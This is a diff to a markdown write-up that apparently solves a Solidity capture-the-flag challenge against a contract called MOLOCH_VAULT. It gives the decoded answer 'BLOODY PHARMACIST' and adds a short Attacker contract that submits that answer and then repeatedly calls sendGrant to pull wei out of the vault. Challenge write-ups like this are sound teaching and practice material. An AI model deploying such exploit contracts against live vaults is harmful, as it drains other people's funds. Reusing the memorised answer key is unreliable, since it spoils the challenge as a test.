@@ -48,7 +48,38 @@ _PASSSS: ["KCLEQ","BGTGJQNGP","ZJQQBW*NFCPKCAKQR"]
 ## Expected answer (using above inputs)
 - **BLOODY PHARMACIST**
 
+## Coded exploit
+```
+contract Attacker {
+    MOLOCH_VAULT vault;
+    uint public f;
 
+    constructor(address payable a) payable{
+        vault = MOLOCH_VAULT(a);
+    }
+
+    /*@attack is called with the following payload;
+    ["BLOODY PHARMACIST","WHO DO YO", "USERVE?"]
+    */
+    function attack(string[3] memory _ansa) public payable returns(bool success) {
+        vault.uhER778(_ansa);
+        success = true;
+    }
+
+    // Now the withdraw() can be called multiple times to keep extracting 1wei
+    function withdraw() public {
+        vault.sendGrant(payable(address(this)));
+    }
+
+    receive() external payable {
+        if (f < 1) {
+            (bool sent,) = msg.sender.call{value: 2 wei}("");
+            require(sent, "unsuccessful");
+        }
+        f++;
+    }
+}
+```
 
 Inspiration. [^1]
 [^1]: So much inspiration gotten from [Molochdao website](https://molochdao.com)
